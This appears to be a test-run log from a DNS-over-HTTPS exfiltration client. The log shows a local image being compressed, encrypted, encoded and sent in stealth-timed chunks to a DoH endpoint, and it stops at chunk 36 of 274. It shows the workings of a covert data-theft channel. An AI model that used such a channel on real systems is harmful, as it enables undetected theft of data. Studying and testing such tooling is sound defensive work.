[client] Starting quick test: stealth.json
Starting DoH exfiltration: /app/test_data/image.png
Configuration: Server: https://doh.local/dns-query, Chunk: 12, Encoding: custom, Timing: stealth
Checking DoH server connectivity...
Testing server: https://doh.local/dns-query
Attempt 1/10...
DoH server connectivity verified with google.com
Server ready for exfiltration!
Chunk size calculation:
   File size: 6,918 bytes
   Strategy: medium file
   Optimal chunk size: 30 chars
   Estimated chunks: 323
   Estimated time: 2584.0s
Chunk size: 12 â†’ 30 (auto-adjusted)
ðŸ—œï¸  Compressed: 6918 -> 6165 bytes
Chunk size calculation:
   File size: 6,165 bytes
   Strategy: medium file
   Optimal chunk size: 30 chars
   Estimated chunks: 288
   Estimated time: 2304.0s
Encrypted data
Encoded with custom: 8220 chars
File size: 6918 bytes
Prepared data size: 8220 bytes
Total chunks: 274

Starting chunk transmission...
Session ID: 1755191988_vsc7tmc6
Estimated transmission time: 6576.0s
Chunk utilization: 100.0%
[  1/274] Sent chunk: 17551919-0000-0274-bP9tYdhu9jdpmpTGx2dmabjHzwxDl9....
[  2/274] Sent chunk: 17551919-0001-0274-IgISkiJSAhyBDxQGO85GY6fHavdX56....
[  3/274] Sent chunk: 17551919-0002-0274-R_WUqIggoHQIA0gJOAwpJaN0I06w-V....
[  4/274] Sent chunk: 17551919-0003-0274-qDiV-xFrOjtMH0TIpn77XO2vuHHXvf....
[  5/274] Sent chunk: 17551919-0004-0274-6B49DRcNc3SR21YDd11rcYEwYqGj5P....
[  6/274] Sent chunk: 17551919-0005-0274-VBqI8EMl8NXRMqKqqZP8YLJi3svMWc....
[  7/274] Sent chunk: 17551919-0006-0274-Wmu7RqA_-DFB_15SktNPy8LvkbezX6....
[  8/274] Sent chunk: 17551919-0007-0274-CjzyBUVVE8pqWUtrKwTsNk4O_HJX9b....
[  9/274] Sent chunk: 17551919-0008-0274-hYukenzfwEQLBEHgjJmajJPs8QCEa1....
[ 10/274] Sent chunk: 17551919-0009-0274-2-7t-T5SMAAiWDkVNQUlHT0NLRMzAt....
[ 11/274] Sent chunk: 17551919-0010-0274-zqmloLaimaWksCq3q7Wj7yq_gKCQsM....
[ 12/274] Sent chunk: 17551919-0011-0274-g10etiN8QlJNbQCqukvrXNPDUt5Z-c....
[ 13/274] Sent chunk: 17551919-0012-0274-QHMVrqauoXlXS_uejq6evoGh4oWYZm....
[ 14/274] Sent chunk: 17551919-0013-0274-Nr8cfx_CIHaGnp7NrZOzg-dnrq7OLq....
[ 15/274] Sent chunk: 17551919-0014-0274-9szdw9O4b5S9q6OnYEtVUWcWxPf_MC....
[ 16/274] Sent chunk: 17551919-0015-0274-QqPCIy6lV0zOvYuPiExNeQ8bXYgOST....
[ 17/274] Sent chunk: 17551919-0016-0274-x4nlg47MsPYidPGbtyXv3n8o_Vj2qb....
[ 18/274] Sent chunk: 17551919-0017-0274-ziABEwlPvbXeoekHTSf_0fmd_a2jEd....
[ 19/274] Sent chunk: 17551919-0018-0274-Xd-7e3r7-n8MDA6OsGuCKjKvmUxDBh....
[ 20/274] Sent chunk: 17551919-0019-0274-J___76_Z7H__m7sLi0vLK6trG5tc7H....
[ 21/274] Sent chunk: 17551919-0020-0274-ng4Di4ivg539L0hGTHUM-YxUBgC2YN....
[ 22/274] Sent chunk: 17551919-0021-0274-276iZB01uF97yBxL-qdRQRgl0uf3eT....
[ 23/274] Sent chunk: 17551919-0022-0274-QW4r3f4szaw-n499ovzWOk7HSHz9mK....
[ 24/274] Sent chunk: 17551919-0023-0274-AXVZ-P9iP2tIeKvnOa1-TRVXrOsfE6....
[ 25/274] Sent chunk: 17551919-0024-0274-dgo-yUu7Egua9yupkw0Pv96g79L4ME....
[ 26/274] Sent chunk: 17551919-0025-0274-T2eCV4e6WZcz9LL7bfqC-yGRJbqLja....
[ 27/274] Sent chunk: 17551919-0026-0274-VbzmcgNThZD_NHP4Z_9QCY7VvjFgOI....
Progress: 9.9% (27/274) - ETA: 7083.9s
[ 28/274] Sent chunk: 17551919-0027-0274-3djRDjHBDNyRykzJW3yMtlYQKxO-n5....
[ 29/274] Sent chunk: 17551919-0028-0274-ampN1Nzt5XjuZklRnuXKLxyAF_eaR4....
[ 30/274] Sent chunk: 17551919-0029-0274-0NHbzr-6fA--l1ktJdkxpdZQ0TAnkA....
[ 31/274] Sent chunk: 17551919-0030-0274-8DeFcnRdoLLHVqnlxQnJFBN3wQqR-i....
[ 32/274] Sent chunk: 17551919-0031-0274-54uyB_25k4-KBggtPsonerpBg1mtaa....
[ 33/274] Sent chunk: 17551919-0032-0274-PdldP1wvMR9ZxScYyx16oZ01nhgGm_....
[ 34/274] Sent chunk: 17551919-0033-0274-6-d8q5BWZNmwipGvRMpflE_PrC5t97....
[ 35/274] Sent chunk: 17551919-0034-0274-7sW9Tnv-TowzgWEsBbAUhbPbYgn7wg....
[ 36/274] Sent chunk: 17551919-0035-0274-dol3SRr3A-U8oZjcikT6GIa1fr56KD....
